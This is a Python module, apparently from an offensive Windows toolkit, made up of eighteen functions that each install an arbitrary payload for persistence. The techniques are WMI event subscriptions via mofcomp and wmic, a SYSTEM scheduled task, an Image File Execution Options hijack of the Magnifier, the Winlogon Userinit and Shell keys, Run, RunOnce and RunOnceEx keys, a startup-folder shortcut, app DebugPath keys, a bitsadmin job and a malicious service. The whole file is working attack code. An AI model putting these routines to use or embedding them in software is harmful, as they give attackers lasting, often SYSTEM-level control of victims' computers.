import datetime
import tempfile
import time

from .utils import *
from .winstructures import *

persist1_info = {
    "Description": "Persistence using mofcomp.exe (SYSTEM privileges)",
    "Method": "Malicious mof file using EventFilter EventConsumer and binding",
    "Id": "1",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist1",
    "Function Payload": True,
}


def persist1(payload, name="", check=True, add=True):
    ret = 1
    if not add:
        cmds = [
            ('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
            ('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
            ('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
        ]
        for i, cmd in cmds:
            exit_code = create("wmic.exe", params=cmd.format(name=name, path=" ".join(payload)), get_exit_code=True)
            if not exit_code:
                log.info(f"Successfully removed {i} (exit code: {exit_code})")
            else:
                ret = 0
                log.error(f"Unable to removed {i} (exit code: {exit_code})")

            time.sleep(3)
        return ret

    mof_template = '''#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $Filt
{
    Name = "''' + name + '''";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";
    QueryLanguage = "WQL";
    EventNamespace = "root\\\\cimv2";
};

instance of CommandLineEventConsumer as $Cons
{
    Name = "''' + name + '''";
    RunInteractively=false;
    CommandLineTemplate="''' + " ".join(payload).replace(os.sep, os.sep*2) + '''";
};

instance of __FilterToConsumerBinding
{
    Filter = $Filt;
    Consumer = $Cons;
};'''

    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    temp = os.path.join(tempfile.gettempdir(), f"{name}.mof")
    try:
        mof_file = open(temp, "w")
        mof_file.write(mof_template)
        mof_file.close()
        log.info(f"Successfully wrote mof template to disk ({temp})")
    except Exception:
        log.error(f"Cannot proceed, unable to write mof file to disk ({temp})")
        return

    time.sleep(5)

    if os.path.isfile(temp):
        log.debug("Disabling file system redirection")
        with disable_fsr():
            log.info("Successfully disabled file system redirection")
            exit_code = create("mofcomp.exe", params=temp, get_exit_code=True)
            log.debug(f"Exit code: {exit_code}")
            if not exit_code:
                log.info(f"Successfully compiled mof file containing our payload ({' '.join(payload)})")
                log.info(f"Successfully installed persistence, payload will after boot")
            else:
                ret = 0
                log.error(f"Unable to compile mof file containing our payload ({' '.join(payload)})")

        time.sleep(5)

        try:
            os.remove(temp)
            log.info("Successfully cleaned up, enjoy!")
        except Exception:
            log.error("Unable to cleanup")
    else:
        log.error(f"Unable to locate mof template on disk ({temp})")

    return ret


persist2_info = {
    "Description": "Persistence using schtasks.exe (SYSTEM privileges)",
    "Method": "Malicious scheduled task",
    "Id": "2",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist2",
    "Function Payload": True,
}


def persist2(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    if not add:
        if create(f"schtasks.exe", params=f"/delete /tn {name} /f"):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    xml_template = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Date>{str(datetime.datetime.now()).replace(' ', 'T')}</Date>
        <URI>\\Microsoft\\Windows\\{name}</URI>
    </RegistrationInfo>
    <Triggers>
        <LogonTrigger>
            <Enabled>true</Enabled>
        </LogonTrigger>
    </Triggers>
    <Principals>
        <Principal id="Author">
            <UserId>S-1-5-18</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>false</AllowHardTerminate>
        <StartWhenAvailable>true</StartWhenAvailable>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
            <StopOnIdleEnd>true</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>false</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
        <Priority>7</Priority>
        <RestartOnFailure>
            <Interval>PT2H</Interval>
            <Count>999</Count>
        </RestartOnFailure>
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>"{payload}"</Command>
        </Exec>
    </Actions>
</Task>"""

    temp = os.path.join(tempfile.gettempdir(), f"{name}.xml")
    ret = 0
    try:
        xml_file = open(temp, "w")
        xml_file.write(xml_template)
        xml_file.close()
    except Exception:
        return

    time.sleep(5)

    if os.path.isfile(temp):
        if create("schtasks.exe", params=f"/create /xml {temp} /tn {name}"):
            log.info("Successfully created scheduled task, payload will run at login")
            ret = 1
        else:
            log.error("Unable to create scheduled task")

        time.sleep(5)

        try:
            os.remove(temp)
        except Exception:
            pass
    else:
        log.error("Unable to create scheduled task, xml file not found")

    return ret


persist3_info = {
    "Description": "Persistence using image file execution option and magnifier.exe",
    "Method": "Image File Execution Options debugger and accessibility application",
    "Id": "3",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist3",
    "Function Payload": True,
}


def persist3(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    if "64" in architecture():
        magnify_key = "Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
    else:
        magnify_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"

    accessibility_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"

    val = read_key("hklm", magnify_key, "Debugger")

    if not add:
        if check and val != " ".join(payload):
            return -1
        if remove_key(hkey="hklm", path=accessibility_key, name="Configuration"):
            if remove_key(hkey="hklm", path=magnify_key, delete_key=True):
                log.info("Successfully removed persistence")
                return 1

        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != " ".join(payload) and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hklm", path=magnify_key, name="Debugger", value=" ".join(payload), create=True):
        log.info(f"Successfully created Debugger key containing payload ({' '.join(payload)})")
        if modify_key(hkey="hklm", path=accessibility_key, name="Configuration", value="magnifierpane", create=True):
            log.info("Successfully installed persistence, payload will run at login")
            return 1
    log.error("Unable to install persistence")


persist4_info = {
    "Description": "Persistence using userinit key",
    "Method": "Registry key (UserInit) manipulation",
    "Id": "4",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist4",
    "Function Payload": True,
}


def persist4(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
    p = os.path.join(system_directory(), "userinit.exe,")

    val = read_key("hklm", winlogon, "Userinit")
    if not add:
        if check and val != f'{p}explorer "{" ".join(payload)}"':
            return -1
        if modify_key(hkey="hklm", path=winlogon, name="Userinit", value=p):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'{p}explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hklm", path=winlogon, name="Userinit", value=f'{p}explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created Userinit key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will run at login")
        return 1
    log.error("Unable to install persistence")


persist5_info = {
    "Description": "Persistence using HKCU run key",
    "Method": "Registry key (HKCU Run) manipulation",
    "Id": "5",
    "Type": "Persistence",
    "Fixed In": "99999",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "persist5",
    "Function Payload": True,
}


def persist5(payload, name="", check=True, add=True):
    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name)
    if not add:
        if check and val != f'explorer "{" ".join(payload)}"':
            return -1
        if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=f'explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will run at login")
        return 1
    log.error("Unable to install persistence")


persist6_info = {
    "Description": "Persistence using HKLM run key",
    "Method": "Registry key (HKLM Run) manipulation",
    "Id": "6",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist6",
    "Function Payload": True,
}


def persist6(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    if "64" in architecture():
        kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
    else:
        kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    val = read_key("hklm", kpath, name)
    if not add:
        if check and val != f'explorer "{" ".join(payload)}"':
            return -1
        if remove_key(hkey="hklm", path=kpath, name=name):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will run at login")
        return 1
    log.error("Unable to install persistence")


persist7_info = {
    "Description": "Persistence using wmic.exe (SYSTEM privileges)",
    "Method": "Malicious mof file using EventFilter EventConsumer and binding",
    "Id": "7",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist7",
    "Function Payload": True,
}


def persist7(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    cmds_create = [
        ('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360"'),
        ('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="{name}", ExecutablePath="{path}", CommandLineTemplate="{path}"'),
        ('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter=\'__EventFilter.Name="{name}"\', Consumer=\'CommandLineEventConsumer.Name="{name}"\''),
    ]
    cmds_delete = [
        ('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
        ('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
        ('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
    ]

    action = "create" if add else "delete"
    ret = 1

    for i, cmd in (cmds_create if add else cmds_delete):
        exit_code = create('wmic.exe', params=cmd.format(name=name, path=" ".join(payload)), get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully {action} {i} (exit code: {exit_code})")
        else:
            log.error(f"Unable to {action} {i} (exit code: {exit_code})")
            ret = 0

        time.sleep(3)

    return ret


persist8_info = {
    "Description": "Persistence using startup files",
    "Method": "Malicious lnk file in startup directory",
    "Id": "8",
    "Type": "Persistence",
    "Fixed In": "99999",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "persist8",
    "Function Payload": True,
}


def persist8(payload, name="", check=True, add=True):
    startup_dir = os.path.join(os.path.expandvars("%AppData%"), r'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    if not os.path.exists(startup_dir):
        log.error("Start up directory not found: {startup_dir}")
        return

    startup_file_path = os.path.join(startup_dir, f'{name}.eu.url')
    if not add:
        log.debug(f"Removing startup file ({startup_file_path})")
        try:
            os.remove(startup_file_path)
            log.info("Successfully removed persistence")
            return 1
        except Exception:
            log.error("Unable to remove persistence")
            return

    with open(startup_file_path, 'w') as f:
        f.write(f'\n[InternetShortcut]\nURL=file:///{" ".join(payload)}\n')
    log.info(f'Startup file created: {startup_file_path}')
    log.info("Successfully installed persistence, payload will run at login")
    return 1


# https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/

persist9_info = {
    "Description": "Persistence using Cortana windows app",
    "Method": "Registry key (Class) manipulation",
    "Id": "9",
    "Type": "Persistence",
    "Fixed In": "99999",
    "Works From": "14393",
    "Admin": False,
    "Function Name": "persist9",
    "Function Payload": True,
}


def persist9(payload, name="", check=True, add=True):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ActivatableClasses\Package", 0, winreg.KEY_READ)
        num = winreg.QueryInfoKey(key)[0]
        kpath = None
        for x in range(0, num):
            if "Microsoft.Windows.Cortana_" in winreg.EnumKey(key, x):
                kpath = os.path.join(
                    r"Software\Classes\ActivatableClasses\Package", winreg.EnumKey(key, x),
                    r"DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
                )
                break
        assert kpath
    except Exception:
        log.error("Unable to add persistence, Cortana is unavailable on this system")
        return

    if not add:
        if remove_key(hkey="hkcu", path=kpath, name="DebugPath"):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return
    if modify_key(hkey="hkcu", path=kpath, name="DebugPath", value=" ".join(payload), create=True):
        log.info(f"Successfully created DebugPath key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will run at login")
        return 1
    log.error("Unable to add persistence")


# https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/

persist10_info = {
    "Description": "Persistence using People windows app",
    "Method": "Registry key (Class) manipulation",
    "Id": "10",
    "Type": "Persistence",
    "Fixed In": "99999",
    "Works From": "14393",
    "Admin": False,
    "Function Name": "persist10",
    "Function Payload": True,
}


def persist10(payload, name="", check=True, add=True):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ActivatableClasses\Package", 0, winreg.KEY_READ)
        num = winreg.QueryInfoKey(key)[0]
        kpath = None
        for x in range(0, num):
            if "Microsoft.People_" in winreg.EnumKey(key, x):
                kpath = os.path.join(
                    r"Software\Classes\ActivatableClasses\Package", winreg.EnumKey(key, x),
                    r"DebugInformation\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca"
                )
                break
        assert kpath
    except Exception:
        log.error("Unable to add persistence, People app is unavailable on this system")
        return

    if not add:
        if remove_key(hkey="hkcu", path=kpath, name="DebugPath"):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    if modify_key(hkey="hkcu", path=kpath, name="DebugPath", value=" ".join(payload), create=True):
        log.info(f"Successfully created DebugPath key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will run at login")
        return 1
    log.error("Unable to add persistence")


# Creds: https://oddvar.moe and https://github.com/3gstudent/bitsadminexec

persist11_info = {
    "Description": "Persistence using bitsadmin.exe",
    "Method": "Malicious bitsadmin job",
    "Id": "11",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist11",
    "Function Payload": True,
}


def persist11(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return False

    if not add:
        log.debug("Performing cleanup")
        exit_code = create("bitsadmin.exe", params=f"/complete {name}", get_exit_code=True)

        if not exit_code:
            log.info(f"Successfully deleted job ({name}) exit code ({exit_code})")
            return 1
        log.error(f"Unable to delete job ({name}) exit code ({exit_code})")
        return

    ret = 0
    # if fails, anti-virus is probably blocking this method
    with disable_fsr():
        exit_code = create("bitsadmin.exe", params=f"/create {name}", get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully created job ({name}) exit code ({exit_code})")
        else:
            log.error(f"Unable to create job ({name}) exit code ({exit_code})")

        cmd = os.path.join(system_directory(), 'cmd.exe')
        temp = os.path.join(tempfile.gettempdir(), "cmd.exe")
        exit_code = create("bitsadmin.exe", params=f"/addfile {name} {cmd} {temp}", get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully added file ({cmd}) to specified job ({name}) exit code ({exit_code})")
        else:
            log.error(f"Unable to add file ({cmd}) to specified job ({name}) exit code ({exit_code})")

        exit_code = create("bitsadmin.exe", params=f'/SetNotifyCmdLine {name} {" ".join(payload)} NULL', get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully attached payload ({' '.join(payload)}) to job ({name}) exit code ({exit_code})")
        else:
            log.error(f"Unable to attach payload ({' '.join(payload)}) to job ({name}) exit code ({exit_code})")

        exit_code = create("bitsadmin.exe", params=f"/Resume {name}", get_exit_code=True)
        if not exit_code:
            log.info(f"Successfully initiated job ({name}) exit code ({exit_code})")
            ret = 1
        else:
            log.error(f"Unable to initiate job ({name}) exit code ({exit_code})")

    time.sleep(5)

    # pid = get_process_pid(os.path.split(" ".join(payload))[1])
    # if pid:
    #     log.info(f"Successfully started payload PID: {pid}")
    # else:
    #     log.error("Unable to start payload")
    return ret


persist12_info = {
    "Description": "Persistence using Windows Service (SYSTEM privileges)",
    "Method": "Malicious Windows Service",
    "Id": "12",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist12",
    "Function Payload": True,
}


def persist12(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    servicename = bytes(name, 'utf-8')
    localhost = rb"\\localhost"
    ret = 0

    if not add:
        schSCManager = OpenSCManager(localhost, b"ServicesActive", 0x0001 | 0x0002)
        if not schSCManager:
            log.error(f"Error while connecting to the local service database using OpenSCManager: ({GetLastError()})")
            return

        svcHandle = OpenService(schSCManager, servicename, 0x00010000)
        if DeleteService(svcHandle):
            log.info(f"Successfully deleted service ({servicename})")
            ret = 1
        else:
            log.error(f"Unable to delete service ({servicename})")

        CloseServiceHandle(schSCManager)
        CloseServiceHandle(svcHandle)
        return ret

    log.debug("Installing service")
    schSCManager = OpenSCManager(localhost, b"ServicesActive", 0x0001 | 0x0002)
    if not schSCManager:
        log.error(f"Error while connecting to the local service database using OpenSCManager: ({GetLastError()})")
        return

    schService = CreateService(
        schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 0x00000002, 0x00000000,
        bytes(f"rundll32.exe {os.path.join(system_directory(), 'zipfldr.dll')},RouteTheCall {' '.join(payload)}", encoding="utf-8"),
        None, None, None, None, None
    )
    if not schService:
        log.error(f"Error while installing our service using CreateService: ({GetLastError()})")
    else:
        log.info(f"Successfully installed service ({servicename}) to load {' '.join(payload)}")
        ret = 1

    CloseServiceHandle(schSCManager)
    CloseServiceHandle(schService)

    return ret


persist13_info = {
    "Description": "Persistence using HKCU runOnce key",
    "Method": "Registry key (HKCU RunOnce) manipulation",
    "Id": "13",
    "Type": "Persistence",
    "Fixed In": "99999",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "persist13",
    "Function Payload": True,
}


def persist13(payload, name="", check=True, add=True):
    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name)
    if not add:
        if check and val != f'explorer "{" ".join(payload)}"':
            return -1
        if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name=name):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name=name, value=f'explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will runOnce at login")
        return 1
    log.error("Unable to install persistence")


persist14_info = {
    "Description": "Persistence using HKLM runOnce key",
    "Method": "Registry key (HKLM RunOnce) manipulation",
    "Id": "14",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist14",
    "Function Payload": True,
}


def persist14(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    if "64" in architecture():
        kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    else:
        kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

    val = read_key("hklm", kpath, name)
    if not add:
        if check and val != f'explorer "{" ".join(payload)}"':
            return -1
        if remove_key(hkey="hklm", path=kpath, name=name):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will runOnce at login")
        return 1
    log.error("Unable to install persistence")


persist15_info = {
    "Description": "Persistence using HKCU runOnceEx key",
    "Method": "Registry key (HKCU RunOnce) manipulation",
    "Id": "15",
    "Type": "Persistence",
    "Fixed In": "99999",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "persist15",
    "Function Payload": True,
}


def persist15(payload, name="", check=True, add=True):
    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name)
    if not add:
        if check and val != f'explorer "{" ".join(payload)}"':
            return -1
        if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name=name):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name=name, value=f'explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will runOnceEx at login")
        return 1
    log.error("Unable to install persistence")


persist16_info = {
    "Description": "Persistence using HKLM runOnceEx key",
    "Method": "Registry key (HKLM RunOnceEx) manipulation",
    "Id": "16",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist16",
    "Function Payload": True,
}


def persist16(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    if "64" in architecture():
        kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx"
    else:
        kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx"

    val = read_key("hklm", kpath, name)
    if not add:
        if check and val != f'explorer "{" ".join(payload)}"':
            return -1
        if remove_key(hkey="hklm", path=kpath, name=name):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created {name} key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will runOnceEx at login")
        return 1
    log.error("Unable to install persistence")


persist17_info = {
    "Description": "Persistence using HKCU Shell key",
    "Method": "Registry key (HKCU Shell) manipulation",
    "Id": "17",
    "Type": "Persistence",
    "Fixed In": "99999",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "persist17",
    "Function Payload": True,
}


def persist17(payload, name="", check=True, add=True):
    winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
    val = read_key("hkcu", winlogon, "Shell")
    if not add:
        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"':
            return -1
        if remove_key(hkey="hkcu", path=winlogon, name="Shell"):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hkcu", path=winlogon, name="Shell", value=f'explorer.exe,explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created Shell key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will run at login")
        return 1
    log.error("Unable to install persistence")


persist18_info = {
    "Description": "Persistence using HKLM Shell key",
    "Method": "Registry key (HKLM Shell) manipulation",
    "Id": "18",
    "Type": "Persistence",
    "Fixed In": "99999" if admin() else "0",
    "Works From": "7600",
    "Admin": True,
    "Function Name": "persist18",
    "Function Payload": True,
}


def persist18(payload, name="", check=True, add=True):
    if not admin():
        log.error("Cannot proceed, we are not elevated")
        return

    kpath = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

    val = read_key("hklm", kpath, "Shell")
    if not add:
        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"':
            return -1
        if modify_key(hkey="hklm", path=kpath, name="Shell", value="explorer.exe"):
            log.info("Successfully removed persistence")
            return 1
        log.error("Unable to remove persistence")
        return

    target = get_target(val)
    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
        return -1

    if modify_key(hkey="hklm", path=kpath, name="Shell", value=f'explorer.exe,explorer "{" ".join(payload)}"'):
        log.info(f"Successfully created Shell key containing payload ({' '.join(payload)})")
        log.info("Successfully installed persistence, payload will run at login")
        return 1
    log.error("Unable to install persistence")
